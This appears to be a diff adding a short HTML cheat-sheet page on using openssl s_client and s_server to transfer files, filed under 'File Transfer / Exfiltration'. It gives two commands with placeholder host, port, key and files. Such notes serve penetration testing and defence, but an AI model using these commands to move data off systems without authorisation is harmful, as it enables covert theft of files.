@@ -1,0 +1,12 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Openssl File Transfer</title>
+</head><body>Openssl can be used to transfer files too! See in File Transfer / Exfiltration<br/>
+<br/>
+#Connect, Receive<br/>
+openssl s_client -quiet -connect &lt;ip&gt;:&lt;port&gt; &gt; file.out<br/>
+<br/>
+#Listen, Send<br/>
+openssl s_server -quiet -key &lt;key&gt; -cert &lt;cert&gt; -port &lt;port&gt; &lt; file.in</body></html>
